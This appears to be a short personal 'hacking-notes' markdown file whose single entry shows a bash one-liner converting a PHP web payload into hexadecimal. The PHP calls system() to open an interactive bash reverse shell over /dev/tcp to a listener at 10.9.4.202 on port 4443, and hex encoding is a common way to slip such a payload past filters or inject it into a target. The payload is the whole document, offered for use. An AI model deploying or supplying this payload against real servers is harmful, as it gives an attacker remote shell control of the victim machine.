# hacking-notes


## conversion

PHP code into hexadecimal

```bash
echo '<?php system("bash -i >& /dev/tcp/10.9.4.202/4443 0>&1") ?>' | xxd -p -u | tr -d '\n'
```

